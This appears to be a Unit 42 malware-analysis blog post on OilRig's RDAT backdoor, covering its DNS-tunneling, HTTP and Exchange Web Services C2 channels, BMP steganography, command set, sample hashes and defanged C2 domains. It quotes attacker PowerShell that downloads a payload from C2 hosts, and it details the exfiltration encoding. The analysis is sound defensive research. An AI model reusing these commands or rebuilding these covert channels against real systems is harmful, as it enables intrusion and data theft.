<p>In Symantec’s Greenbug report, once the adversary gained interactive access to target hosts, they were observed executing PowerShell commands to perform post-exploitation activities. In one instance, a Powershell script was executed to retrieve RDAT from the C2 <span style="font-family: 'courier new', courier, monospace;">apps.vvvnews[.]com</span>, save it to <span style="font-family: 'courier new', courier, monospace;">C:\Programdata\Nt.dat</span>, and move it to <span style="font-family: 'courier new', courier, monospace;">C:\Programdata\Vmware\VMware.exe</span> as seen in the following snippet:</p>
<p><span style="font-family: 'courier new', courier, monospace;">(New-Object System.Net.WebClient).DownloadFile('http://apps[.]vvvnews .com:8080/Yf.dat', 'C:\Programdata\Nt.dat');</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">move C:\Programdata\Nt.dat C:\Programdata\Vmware\VMware.exe -force;</span></p>
<p>During our research, we collected a very similar PowerShell script using a different C2 and with some variations in commands, but with the same file path of <span style="font-family: 'courier new', courier, monospace;">C:\Programdata\Nt.dat:</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">$WebClient = New-Object System.Net.WebClient; $WebProxy = New-Object System.Net.WebProxy('http://192.168.3.4:8080',$true); $WebClient.Proxy = $WebProxy;Try {$WebClient.DownloadFile('http://digi.shanx[.]icu:8080/Nt.dat','C:\Programdata\Nt.dat')} Catch {$_.Exception.Message | out-file C:\Programdata\Exceptions.dat};</span></p>
<p>Unfortunately, we could not verify the contents of Nt.dat due to the C2 server <span style="font-family: 'courier new', courier, monospace;">http://digi.shanx[.]icu:8080</span> being unavailable at the time of analysis.</p>
<h2><a id="post-108014-_r11rnz14o9od"></a><strong>RDAT Backdoor</strong></h2>
<p>The adversaries compiled the RDAT payloads used in the attacks on the Middle Eastern telecommunications organization on March 1, 2020, and configured it to use a domain provided on the command line or the hardcoded domain <span style="font-family: 'courier new', courier, monospace;">rsshay[.]com</span> as its C2 server. Unlike previous RDAT samples, this particular sample only uses DNS tunneling for its C2 communications with no HTTP fallback channel. This RDAT sample can only use TXT queries in its DNS tunnel and will issue queries structured like the following:</p>
<p><span style="font-family: 'courier new', courier, monospace;">&lt;encoded data&gt;.&lt;encoding method, 0 for base64 or 1 for base32&gt;&lt;encryption key&gt;.&lt;C2 domain&gt;</span></p>
<p>The encoded data portion of the subdomain is encoded base32 if the actor includes a command line argument 1 – otherwise, it uses base64. The payload also substitutes characters within the base64 encoded subdomain to avoid including characters that are not allowed in domain names, such as = with -, / with _ and + with -a. For example, we observed the following beacon during our testing:</p>
<p><span style="font-family: 'courier new', courier, monospace;">91mzXgXT-a9sLktr-aOz8pAw--.0R2.rsshay[.]com</span></p>
<p>The encoded data in the beacon (subdomain) is ciphertext generated using AES and a 16-byte key generated by concatenating two randomly chosen alphanumeric characters that are also present in the subdomain immediately before the C2 domain. For instance, if the two random alphanumeric characters included in the subdomain were R2, the payload would use the string <span style="font-family: 'courier new', courier, monospace;">R2R2R2R2R2R2R2R2</span> as a key to encrypt the data. The example beacon above would decrypt to <span style="font-family: 'courier new', courier, monospace;">1,6,1.0_Y,2619</span>, which is structured as follows:</p>
<p><span style="font-family: 'courier new', courier, monospace;">&lt;communications type value&gt;,&lt;ID value from config&gt;,&lt;hardcoded payload version&gt;,&lt;randomly generated number&gt;</span></p>
<p>The payload decodes the response for an answer to the TXT query with base64 and decrypts using the same AES cipher and key as the request. The payload attempts to parse the decrypted cleartext using the regular expression “[^,]+” to get the command value and the command arguments that are split with a comma. The payload then checks the command value using a command handler that has the ability to execute commands and upload and download files, as seen in Table 1.</p>
<table>
<tbody>
<tr>
<td><strong>Command</strong></td>
<td><strong>Description</strong></td>
</tr>
<tr>
<td>0</td>
<td>Idle.</td>
</tr>
<tr>
<td>1</td>
<td>Run specified command. Creates write and read pipes to issue the command and read the output and sends the results to the C2 over the DNS tunnel.</td>
</tr>
<tr>
<td>2</td>
<td>Uploads a file to the C2 by reading in a specified file and sending its contents over the DNS tunnel in chunks.</td>
</tr>
<tr>
<td>3</td>
<td>Downloads a file via the DNS tunnel.</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><em>Table 1. Commands available in RDAT</em></p>
<h2><a id="post-108014-_eagn3og81vqi"></a><strong>Related RDAT</strong></h2>
<p>During our research, we gathered several additional samples by pivoting on the contents of the executables and other various attributes. Table 2 shows when these samples were compiled, their respective C2 server and the service name they use when the actor installs them on the compromised system. As shown by the compilation times, this tool has been in development since 2017, with the most recent sample we collected being compiled in April 2020. The sample compiled in August 2017 was uploaded to a webshell related to TwoFace, while the samples compiled in March 2020 were used in the attack on the Middle Eastern telecommunications organization. The RDAT sample compiled in April 2020 was also delivered to the same telecommunications organization, which was configured to use new infrastructure (<span style="font-family: 'courier new', courier, monospace;">sharjatv[.]com, wwmal[.]com</span>) and supported both DNS A and AAAA records for its DNS tunneling C2 channel.</p>
<p>The most interesting sample we discovered was compiled on July 24, 2018. This sample included a novel C2 channel that used the Exchange Web Services (EWS) API to send and receive emails containing steganographic images as attachments. This novel C2 channel supplemented the HTTP and DNS tunneling C2 channels seen in other RDAT samples, all of which we will discuss in detail in the upcoming sections.</p>
<table>
<tbody>
<tr>
<td><strong>SHA256</strong></td>
<td><strong>Compiled</strong></td>
<td><strong>C2</strong></td>
<td><strong>Service Name</strong></td>
</tr>
<tr>
<td><span style="font-family: 'courier new', courier, monospace;">7395a3ada245..</span></td>
<td>2017-08-07</td>
<td>Provided as argument</td>
<td>Service</td>
</tr>
<tr>
<td><span style="font-family: 'courier new', courier, monospace;">8f943bc5b205..</span></td>
<td>2018-03-13</td>
<td>Provided as argument</td>
<td>My Sample Service</td>
</tr>
<tr>
<td><span style="font-family: 'courier new', courier, monospace;">8120849fbe85..</span></td>
<td>2018-07-24</td>
<td>allsecpackupdater[.]com</p>
<p>tacsent[.]com</p>
<p>koko@acrlee[.]com</p>
<p>h76y@acrlee[.]com</td>
<td>N/A</td>
</tr>
<tr>
<td><span style="font-family: 'courier new', courier, monospace;">bcdb63b3520e..</span></td>
<td>2018-08-27</td>
<td>Provided as argument</td>
<td>N/A</td>
</tr>
<tr>
<td><span style="font-family: 'courier new', courier, monospace;">f42c2b40574d..</span></td>
<td>2018-09-09</td>
<td>Provided as argument</td>
<td>My Sample Service</td>
</tr>
<tr>
<td><span style="font-family: 'courier new', courier, monospace;">fcabb86331cd..</span></td>
<td>2018-09-09</td>
<td>Provided as argument</td>
<td>My Sample Service</td>
</tr>
<tr>
<td><span style="font-family: 'courier new', courier, monospace;">7b5042d3f0e9..</span></td>
<td>2019-09-17</td>
<td>Provided as argument</td>
<td>Windows Video Service</td>
</tr>
<tr>
<td><span style="font-family: 'courier new', courier, monospace;">ee32bde60d11..</span></td>
<td>2019-11-04</td>
<td>Provided as argument</td>
<td>N/A</td>
</tr>
<tr>
<td><span style="font-family: 'courier new', courier, monospace;">de3f1cc2d4aa..</span></td>
<td>2019-11-11</td>
<td>Provided as argument</td>
<td>My Sample Service</td>
</tr>
<tr>
<td><span style="font-family: 'courier new', courier, monospace;">4ea6da6b35c4..</span></td>
<td>2020-03-01</td>
<td>rsshay[.]com</td>
<td>Windows Video Service</td>
</tr>
<tr>
<td><span style="font-family: 'courier new', courier, monospace;">acb50b02ab0c..</span></td>
<td>2020-03-01</td>
<td>rdmsi[.]com</td>
<td>Windows Video Service</td>
</tr>
<tr>
<td><span style="font-family: 'courier new', courier, monospace;">55282007716b..</span></td>
<td>2020-03-01</td>
<td>rdmsi[.]com</td>
<td>Windows Video Service</td>
</tr>
<tr>
<td><span style="font-family: 'courier new', courier, monospace;">ba380e589261..</span></td>
<td>2020-03-01</td>
<td>rsshay[.]com</td>
<td>Windows Video Service</td>
</tr>
<tr>
<td><span style="font-family: 'courier new', courier, monospace;">6322cacf839b..</span></td>
<td>2020-04-04</td>
<td>sharjatv[.]com<br />
wwmal[.]com</td>
<td>My Sample Service</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><em>Table 2. Related RDAT samples </em></p>
<h2><a id="post-108014-_5mpb3bop888"></a><strong>Novel C2 Using Exchange Web Services and Steganography</strong></h2>
<p>The novel C2 channel in the RDAT sample uses email for a C2 channel by interacting with the local Exchange server with the EWS API. There are two hardcoded actor-controlled email addresses: <span style="font-family: 'courier new', courier, monospace;">koko@acrlee[.]com</span> and <span style="font-family: 'courier new', courier, monospace;">h76y@acrlee[.]com</span>. These two email addresses are used by the RDAT payload to send and receive emails to facilitate C2. To send emails from the compromised host, the payload uses the email associated with the account logged into the compromised host, as it uses the WinHTTP library to make requests to the API with the "WINHTTP_OPTION_AUTOLOGON_POLICY" field set to <a href="https://docs.microsoft.com/en-us/windows/win32/winhttp/option-flags">'WINHTTP_AUTOLOGON_SECURITY_LEVEL_LOW'</a>, which automatically attempts to log onto Exchange using the default credentials.</p>
<p>The actor communicates with the payload by sending emails from one of two email addresses to the email address of the compromised account. To receive emails from the actor, the payload will:</p>
<ul>
<li>Initially create an inbox rule to move actor’s emails to the junk folder.</li>
<li>Continually look in the junk folder for actor-sent emails that have attachments.</li>
<li>Process attachments for inbound commands hidden within BMP images.</li>
</ul>
<p>To communicate with the actor, the payload sends emails from the account logged into the compromised system and performs the following actions:</p>
<ul>
<li>Creates a draft email with the actor-controlled email address in the “To” field.</li>
<li>Attaches a BMP image with a hidden message or data to exfiltrate to the draft.</li>
<li>Sends the draft to the actor’s email address.</li>
</ul>
<p>To show this channel, we analyzed the outbound HTTP POST requests to the EWS API and took screenshots of the requests. The POST requests all have an anomalous “User-Agent” of “firefox” and use Simple Object Access Protocol (SOAP) messages to interact with the Exchange server. The first request has a SOAP message to create an inbox rule named "ExchangeRule" that moves all inbound emails from the C2 email addresses to the "junkemail" folder. Figure 3 shows the HTTP POST request containing the SOAP message that creates this inbox rule. The rule name is highlighted in the red box, the condition that includes the actor’s email address in the blue box and the action to move it to the junk folder in the green box.</p>
<p><img class="aligncenter wp-image-108024" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/07/word-image-33.png" alt="HTTP POST request creating the inbox rule to move emails from actor to the junk folder" width="1692" height="558" /></p>
<p style="text-align: center;"><em>Figure 3. HTTP POST request creating the inbox rule to move emails from actor to the junk folder</em></p>
<p>The payload will then continually look for new emails from the actor in the junk folder. The payload will issue a request to the EWS API to check for unread emails from the actor’s email addresses with an attachment. Figure 4 shows the HTTP POST the payload issues to check for inbound emails from the actor, with the actor’s email address in the red box, the check for an attachment in the blue box and the junk folder specified in the green box.</p>
<p><img class="aligncenter wp-image-108026" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/07/word-image-34.png" alt="HTTP POST request sent to the Exchange server looking for inbound emails from actor" width="1828" height="684" /></p>
<p style="text-align: center;"><em>Figure 4. HTTP POST request sent to the Exchange server looking for inbound emails from actor</em></p>
<p>If the payload obtains an email sent by the actor, the payload will process the response to the SOAP request and send additional requests to the EWS API to get the email, the attachment and the contents of the attachment. The payload processes the responses to these requests using regular expressions to find specified values within the XML. The payload uses the regular expressions to find the following values within the server’s response:</p>
<ul>
<li><span style="font-family: 'courier new', courier, monospace;">Id</span> and <span style="font-family: 'courier new', courier, monospace;">ChangeKey</span> to get the specified email.</li>
<li><span style="font-family: 'courier new', courier, monospace;">AttachmentId Id</span> to get the attachment from the email.</li>
<li><span style="font-family: 'courier new', courier, monospace;">&lt;t:Content&gt;</span> and <span style="font-family: 'courier new', courier, monospace;">&lt;/t:Content&gt;</span> to get the contents of the attachment.</li>
</ul>
<p>It then saves this content to a file in the %TEMP% folder with a ".bmp" file extension. It then issues a SOAP request to delete the processed email. This completes the process in which the payload receives inbound communications from the actor.</p>
<p>To send its beacon and exfiltrate data to the actor, the payload will interact with the EWS API to perform the following three steps:</p>
<ol>
<li>Save a draft email with the actor’s email address in the “To” field.</li>
<li>Attach the BMP image containing the hidden data to the saved draft email.</li>
<li>Send the saved draft email.</li>
</ol>
<p>Figure 5 shows the draft email with the BMP image attached immediately prior to being sent. The figure shows the actor’s email address in the “To” field, the BMP image with hidden data as the attachment, and subjects and message bodies containing strings of an unknown purpose.</p>
<p><img class="aligncenter wp-image-108028" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/07/word-image-35.png" alt="Screenshot of Outlook Web App showing the email draft created by the payload prior to it being sent to the actor" width="2500" height="595" /></p>
<p style="text-align: center;"><em>Figure 5. Screenshot of Outlook Web App showing the email draft created by the payload prior to it being sent to the actor</em></p>
<p>To carry out this functionality, the payload creates an email and saves it as a draft. This allows it to attach the image containing the hidden data prior to sending the email. Figure 6 shows the SOAP request to the EWS API, specifying that the server should save the email to the drafts folder in the red and blue boxes and the actor’s email address in the green box.</p>
<p><img class="aligncenter wp-image-108030" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/07/word-image-36.png" alt="HTTP POST request creating the email draft prior to attaching the image" width="1826" height="593" /></p>
<p style="text-align: center;"><em>Figure 6. HTTP POST request creating the email draft prior to attaching the image</em></p>
<p>With the email saved in the drafts folder, the payload will then attach the BMP image to the email using an HTTP POST request to the EWS API. Figure 7 shows the request to the EWS API that includes the filename of the attachment in the red box and the base64 content of the attachment in the blue box.</p>
<p><img class="aligncenter wp-image-108032" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/07/word-image-37.png" alt="HTTP POST request attaching the image to the email draft" width="1832" height="584" /></p>
<p style="text-align: center;"><em>Figure 7. HTTP POST request attaching the image to the email draft</em></p>
<p>The payload issues one last request to the EWS API to send the email draft with the attached BMP image to the actor. Figure 8 shows the HTTP POST request issued by the payload to send the email with the <span style="font-family: 'courier new', courier, monospace;">SendItem</span> action highlighted in the red box.</p>
<p><img class="aligncenter wp-image-108034" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/07/word-image-38.png" alt="HTTP POST request sending the email draft to the actor’s email address" width="1828" height="472" /></p>
<p style="text-align: center;"><em>Figure 8. HTTP POST request sending the email draft to the actor’s email address</em></p>
<h4><a id="post-108014-_a7tru4mb1e01"></a>Hiding Data with Steganography</h4>
<p>The payload will receive data from and exfiltrate data to the C2 within email attachments, specifically within the BMP images that use steganography to hide the data within the image. The method with which the payload extracts data from the BMP image to receive data from the C2 is the same as its method for hiding data to exfiltrate. While we did not observe the C2 using this method to send commands, we were able to analyze the payload to determine how it would send messages and exfiltrate data from the system.</p>
<p>To send data using this C2 channel, the payload will read the following image available on a default install of Windows:</p>
<p><span style="font-family: 'courier new', courier, monospace;">C:\ProgramData\Microsoft\User Account Pictures\guest.bmp</span></p>
<p>Depending on the version of Windows, the “guest.bmp” image differs in size and contents.The image from Windows 7 is 128x128 pixels and contains an image of a suitcase, while the Windows 10 image is 448x448 pixels and contains a generic user icon. Figure 9 shows the two images extracted from default installations of Windows 7 and 10 with the latter scaled down in size.</p>
<p><img class="aligncenter wp-image-108081 size-full" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/07/win7_win10_guest_side_by_side_screenshot.png" alt="" width="280" height="141" /></p>
<p style="text-align: center;"><em>Figure 9. The “guest.bmp” image from Windows 7 on the left and Windows 10 on the right</em></p>
<p>The payload determines the height, width and color depth of the image and calculates how many images it will need to modify to send the entirety of the data:</p>
<p><span style="font-family: 'courier new', courier, monospace;">(length of data)/(width*(height-1))</span></p>
<p>It uses the modulo operator to check if there is data that does not fit in the previous image and will add one to the required image count if leftover data exists. The payload then iterates through the data by grabbing a substring of the data that will fit within the image.</p>
<p>To explain how the payload hides data within this image, we must first briefly explain the BMP file format. The BMP file format includes file headers and an array of values used to store the red, green and blue color values of each pixel in the image. The format of each color value in the array of color values varies depending on the color depth, as 24-bit BMP images will use 3-byte values that are used to specify the intensities of red, blue and green colors for each pixel in the image, while 32-bit images use 4-byte values. The RDAT payload can support both 24- and 32-bit images. Since both “guest.bmp” images from Windows 7 and 10 are 24-bit images, we observed the payload using the 3-byte color values for each pixel to hide data. The payload will modify each pixel’s 3-bytes to transmit one byte of exfiltrated data. By spreading the data byte over the 3-bytes for each pixel, the impact on the original image is minor and difficult to visualize. Figure 10 compares the original image from Windows 7 and the modified image carrying the hidden data.</p>
<p><img class="aligncenter wp-image-108079 size-full" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/07/guest_data_side_by_side_screenshot.png" alt="" width="273" height="140" /></p>
<p style="text-align: center;"><em>Figure 10. Original “guest.bmp” image from Windows 7 on the left and the modified carrier image on the right</em></p>
<p>Figure 10 shows how difficult it is to see the hidden data embedded within the BMP image. We zoomed in on the 29 pixels modified to carry the data to visualize the differences and found that they differed slightly in color, as seen in the comparison in Figure 11. All the pixels in the two images are different. However, some of the differences in color are more obvious than others.</p>
<p><img class="wp-image-108044 aligncenter" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/07/word-image-43.png" alt="This zoomed-in view shows the original pixels, showing how subtle the effect of the steganography is in the modified image" width="1740" height="58" /></p>
<p><img class="aligncenter wp-image-108046" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/07/word-image-44.png" alt="This zoomed-in view shows the pixels carrying 29-bytes of data, showing how subtle the effect of the steganography is in the modified image" width="1738" height="56" /></p>
<p style="text-align: center;"><em>Figure 11. This zoomed-in view shows the original pixels on top and pixels carrying 29-bytes of data on the bottom</em></p>
<p>To hide the data within the image, the payload will check the color depth of the “guest.bmp” image for either 24- or 32-bit depth, which allows the payload to determine how many bytes per pixel it will need to spread the bits of the hidden data across. For instance, a 24-bit BMP image like "guest.bmp" from Windows 7, seen in Figure 10 above, will have three bytes per pixel in the image that represents the red, green and blue values for that pixel. Using this 24-bit image, the payload will spread the 8-bits of the data byte across these three bytes, specifically by setting the least significant bit values in the pixel bytes to the bit values of the data byte.</p>
<p>Let's use the example data <span style="font-family: 'courier new', courier, monospace;">8,54351-1616479009,0</span> from a beacon sent from the payload to the C2, which it will encode using base64 to <span style="font-family: 'courier new', courier, monospace;">OCw1NDM1MS0xNjE2NDc5MDA5LDA=</span>, append the <span style="font-family: 'courier new', courier, monospace;">@</span> symbol and embed within a BMP image. The <span style="font-family: 'courier new', courier, monospace;">O</span> ASCII character has a hexadecimal value of <span style="font-family: 'courier new', courier, monospace;">0x4f</span>, which is <span style="font-family: 'courier new', courier, monospace;">01001111</span> in base2. The 8-bits of this base2 representation are then used to set specific bits within the 3-bytes for each pixel:</p>
<ul>
<li>Data bits 0 and 1 replacing the first pixel byte's bits 1 and 0.</li>
<li>Data bits 2, 3 and 4 replacing the second pixel byte’s bits 2, 1 and 0.</li>
<li>Data bits 5, 6 and 7 replacing the third pixel byte's bits 2, 1 and 0.</li>
</ul>
<p>Using this logic, the payload will read the pixel bytes from the “guest.bmp” image, which is <span style="font-family: 'courier new', courier, monospace;">0xe4</span>, <span style="font-family: 'courier new', courier, monospace;">0xdf</span> and <span style="font-family: 'courier new', courier, monospace;">0xb9</span> and replace the following bits using the base2 of <span style="font-family: 'courier new', courier, monospace;">010 011 11</span> for <span style="font-family: 'courier new', courier, monospace;">O</span>:</p>
<ul>
<li>Replace bits 2, 1 and 0 within <span style="font-family: 'courier new', courier, monospace;">0xe4</span> with <span style="font-family: 'courier new', courier, monospace;">010</span>, which results in <span style="font-family: 'courier new', courier, monospace;">0xe2</span>.</li>
<li>Replace bits 2, 1 and 0 within <span style="font-family: 'courier new', courier, monospace;">0xdf</span> with <span style="font-family: 'courier new', courier, monospace;">110</span>, which results in <span style="font-family: 'courier new', courier, monospace;">0xde</span>.</li>
<li>Replace bits 1 and 0 within <span style="font-family: 'courier new', courier, monospace;">0xb9</span> with <span style="font-family: 'courier new', courier, monospace;">11</span>, which results in <span style="font-family: 'courier new', courier, monospace;">0xbb</span>.</li>
</ul>
<p>Figure 12 below shows how these bit replacements occur and how the replacements ultimately change the values of the pixel's bytes.</p>
<p><img class="aligncenter wp-image-108048" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/07/word-image-45.png" alt="Visual explanation of the bit replacement performed on each pixel to hide data in the BMP images, a key aspect of the steganography used by the payload" width="992" height="233" /></p>
<p style="text-align: center;"><em>Figure 12. Visual explanation of the bit replacement performed on each pixel to hide data in the BMP images</em></p>
<h2><a id="post-108014-_aeg93hkzuh7e"></a><strong>HTTP and DNS Tunneling C2 Channels</strong></h2>
<p>The RDAT sample with the novel EWS C2 channel also had HTTP and DNS tunneling as C2 channels as well, which are very similar to other RDAT samples we collected. The HTTP C2 channel uses HTTP POST requests to transmit data to the C2 server. The code contains the following two domains:</p>
<p><span style="font-family: 'courier new', courier, monospace;">allsecpackupdater[.]com</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">tacsent[.]com</span></p>
<p>It should be noted that the code only attempts to use the <span style="font-family: 'courier new', courier, monospace;">tacsent[.]com</span> domain for its HTTP C2 channel. We are unsure why the code contains the <span style="font-family: 'courier new', courier, monospace;">allsecpackupdater[.]com</span> domain as it does not attempt to communicate with it, but it is possible that it is an artifact from a previous version of the tool. This domain was previously tied to the OilRig threat group, as <a href="https://www.clearskysec.com/greenbug/">ClearSky discovered this domain in 2017</a> and noted its relation to Greenbug’s ISMDOOR tool.</p>
<p>The HTTP POST requests have a custom "From:" field in the header that has a unique identifier assigned to the infected system. The HTTP POST request will contain a "v" parameter and a random number in the URL and a user-agent of "chrome." Figure 13 shows an example of an HTTP POST issued by the payload as its initial beacon to the C2, which shows the anomalous user-agent “chrome” and custom “From” field.</p>
<p><img class="aligncenter wp-image-108050" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/07/word-image-46.png" alt="Initial beacon sent by RDAT sample over its HTTP C2 channel" width="824" height="318" /></p>
<p style="text-align: center;"><em>Figure 13. Initial beacon sent by RDAT sample over its HTTP C2 channel</em></p>
<p>The payload encrypts the data sent in the POST request using the AES cipher, specifically in CBC mode. To decrypt this data, the data itself is first converted from the URL-safe hexadecimal percent encoded characters to their /, + and = character equivalent. After this conversion, the resulting data is decoded using base64 and then decrypted using AES and the value in the From field as a key and initialization vector (IV). For instance, using the From value for the key and IV to decrypt the POST data with the AES cipher produces the following cleartext:</p>
<p><span style="font-family: 'courier new', courier, monospace;">1,1543511637567325,12031\x08\x08\x08\x08\x08\x08\x08\x08</span></p>
<p>The payload will check the C2 server's response to this HTTP POST for a , using a regular expression <span style="font-family: 'courier new', courier, monospace;">[^,]+</span> to determine if the C2 provided a command. The payload can only exfiltrate 102,400 bytes of data at a time, which it uses a field in the exfiltrated response to notify the C2 of the offset of the data so the C2 can reconstruct it.</p>
<p>The DNS tunneling protocol is very similar to the protocol discussed earlier in this blog, as it uses the second level subdomain for its AES key but uses four characters instead of two. It also uses the same character replacement of <span style="font-family: 'courier new', courier, monospace;">=</span> with <span style="font-family: 'courier new', courier, monospace;">-, /</span> with <span style="font-family: 'courier new', courier, monospace;">_</span> and <span style="font-family: 'courier new', courier, monospace;">+</span> with <span style="font-family: 'courier new', courier, monospace;">-a</span> to remove characters that are not allowed in domain names, as did the RDAT sample used in the attacks on the Middle Eastern telecommunications organization. The DNS tunnel for this sample used DNS A record queries and the same domain as the HTTP C2 channel, which generates an initial beacon that will resemble the following:</p>
<p><span style="font-family: 'courier new', courier, monospace;">P9rktZsukI5RVAdZWSR-a6uVYKeQJ-azhVLzUUfGs1TDQ-.fN26.tacsent[.]com</span></p>
<p>To decrypt this beacon, the C2 uses the second level subdomain to create an AES key and IV of fN26fN26fN26fN26, which is the second-level domain used four times to create a 16-byte string. The resulting cleartext would contain the following message, which is a comma-separated string that includes communication type and a unique system identifier:</p>
<p><span style="font-family: 'courier new', courier, monospace;">3,1543511637567325,0\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c</span></p>
<p>To exfiltrate data using this DNS tunneling protocol, the payload will add additional subdomains to query, specifically a field for the data sequence number and a field for the exfiltrated data. For instance, the following DNS query sends system information to the C2:</p>
<p><span style="font-family: 'courier new', courier, monospace;">1.44gkxXizTF3QJU0F2AllV_0qhr1xcYmy8GeMB6nnGNSw0bls7JpP0zIqvnyO.xEZlrurmSHgf</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">uoAcqi9blguWDzwH9oQCWZ-aTeBSBE2M-.tJ8z.tacsent[.]com</span></p>
<p>The fifth-level subdomain is a data sequence number that allows the C2 server to reassemble the data, which will start with 1 and increment by 60 as the DNS tunneling protocol sends 60-bytes of encoded ciphertext within each DNS request. The fourth-level subdomain contains the 60-bytes of encoded ciphertext that RDAT sends to the C2, while the third- and second-level subdomains are the same as the beacon. In the above example, the AES key and IV would be <span style="font-family: 'courier new', courier, monospace;">tJ8ztJ8ztJ8ztJ8z</span>, which would decrypt the third-level subdomain to the following cleartext:</p>
<p><span style="font-family: 'courier new', courier, monospace;">2,1543511637567325,0\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c</span></p>
<p>Using the same AES key and IV, the cleartext in the fourth-level subdomain includes the system information, which in the above example would produce:</p>
<p><span style="font-family: 'courier new', courier, monospace;">1:|2:MicrosoftWindows7Professionw\x01</span></p>
<p>Regardless of the C2 channel used, the RDAT sample parses responses using a command handler to determine the course of action to take. Table 3 shows the commands available within the command handler, as well as the structure of the response message the payload would send to the C2. The command handler in this RDAT sample has more capabilities compared to the three commands available in the sample seen in the attacks on the Middle Eastern telecommunications organization.</p>
<table style="width: 100%;">
<tbody>
<tr>
<td style="width: 20.9067%;"><strong>Command Structure</strong></td>
<td style="width: 24.0534%;"><strong>Response structure</strong></td>
<td style="width: 54.6666%;"><strong>Description</strong></td>
</tr>
<tr>
<td style="width: 20.9067%;">0,</td>
<td style="width: 24.0534%;"></td>
<td style="width: 54.6666%;">Idle.</td>
</tr>
<tr>
<td style="width: 20.9067%;">1,&lt;task number&gt;,&lt;base64 encoded command to execute&gt;</td>
<td style="width: 24.0534%;">2,&lt;16-char system identifier&gt;,&lt;task number&gt;,&lt;base64 encoded results&gt;,&lt;offset in data&gt;,&lt;total data length&gt;</td>
<td style="width: 54.6666%;">Executes command using "cmd.exe /c"</td>
</tr>
<tr>
<td style="width: 20.9067%;">2,&lt;task number&gt;,&lt;cleartext filename&gt;</td>
<td style="width: 24.0534%;">3,&lt;16-char system identifier&gt;,&lt;task number&gt;,&lt;base64 encoded file contents&gt;,&lt;offset in data&gt;,&lt;total data length&gt;</td>
<td style="width: 54.6666%;">Uploads a specified file from the system.</td>
</tr>
<tr>
<td style="width: 20.9067%;">3,&lt;task number&gt;,&lt;filename&gt;,&lt;file size&gt;</td>
<td style="width: 24.0534%;">4,&lt;16-char system identifier&gt;,&lt;task number&gt;,&lt;offset in data&gt;,&lt;random number&gt;</td>
<td style="width: 54.6666%;">Downloads a file from the C2 response to a temporary file named %TEMP%\tmp&lt;random number&gt;. Downloads 81,920 bytes at a time by sending HTTP POST requests with a communications type of "4" with the offset in the data it wishes to receive and parsing the response for data it will write to the file. Payload then opens the file, base64 decodes and decrypts its contents with AES CBC. Sends "-1" as the offset to C2 to notify the C2 that it decoded/decrypted the temporary file and wrote it to the specified file.</td>
</tr>
<tr>
<td style="width: 20.9067%;">5,&lt;task number&gt;</td>
<td style="width: 24.0534%;">6,&lt;16-char system identifier&gt;,&lt;task number&gt;,&lt;base64 encoded screenshot&gt;,&lt;unk, size?&gt;</td>
<td style="width: 54.6666%;">Takes a screenshot, encodes it as a JPEG, base64 encodes the JPEG image.</td>
</tr>
<tr>
<td style="width: 20.9067%;">6,&lt;task number&gt;</td>
<td style="width: 24.0534%;">7,&lt;16-char system identifier&gt;,&lt;task number&gt;,"&lt;EOF&gt;"</td>
<td style="width: 54.6666%;">Kills the payload's process and reruns it using the "-r" command line switch by running the following on the command line: taskkill /f /pid &lt;current PID&gt; &amp;&amp; &lt;current executable path&gt;</td>
</tr>
<tr>
<td style="width: 20.9067%;">7,&lt;task number&gt;</td>
<td style="width: 24.0534%;">7,&lt;16-char system identifier&gt;,&lt;task number&gt;,"&lt;EOF&gt;"</td>
<td style="width: 54.6666%;">Uninstalls the payload by running the following on the command line: taskkill /f /pid &lt;current PID&gt; &amp;&amp; del /f &lt;current executable path&gt;</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><em>Table 3. Commands available within the RDAT sample that used the novel EWS C2 channel</em></p>
<h2><a id="post-108014-_3qcijtgfuxbc"></a><strong>Conclusion</strong></h2>
<p>The RDAT backdoor has been used by the OilRig threat group for at least three years to target organizations in the Middle East, with the most recent known activity occurring in April 2020 against a telecommunications organization. Over the course of three years, this tool has received continued development efforts that have resulted in multiple variations with differences in functionality and available C2 channels. The majority of samples used some combination of HTTP and DNS tunneling channels, with the single exception where we discovered the developer leveraging Exchange Web Services to send and receive emails to and from the actor using steganographic image file attachments. The use of a novel C2 channel in combination with steganography shows the continued evolution and development of different tactics and techniques by this adversary over time.</p>
<p>Palo Alto Networks customers are protected in the following ways:</p>
<ul>
<li>All RDAT samples have malicious verdicts in <a href="https://www.paloaltonetworks.com/products/secure-the-network/wildfire">WildFire</a> and have protections in place through Cortex XDR.</li>
<li>DNS tunneling protocols used for C2 communications are blocked via <a href="https://www.paloaltonetworks.com/resources/datasheets/dns-security-service">DNS Security</a>.</li>
<li>All C2 domains are classified as Command-and-Control for <a href="https://www.paloaltonetworks.com/products/threat-detection-and-prevention/web-security">URL Filtering</a>.</li>
<li><a href="https://blog.paloaltonetworks.com/2019/11/cortex-threat-intelligence/">AutoFocus</a> customers can monitor activity via the <a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.rdat_backdoor">rdat_backdoor</a> tag.</li>
</ul>
<h2><a id="post-108014-_tv255ms5gptj"></a><strong>Appendix</strong></h2>
<h4><a id="post-108014-_4fk1bkmiob7h"></a>Files Associated with Attack on Telecommunications Organization</h4>
<p><span style="font-family: 'courier new', courier, monospace;">4ea6da6b35c4cdc6043c3b93bd6b61ea225fd5e1ec072330cb746104d0b0a4ec</span> - RDAT backdoor</p>
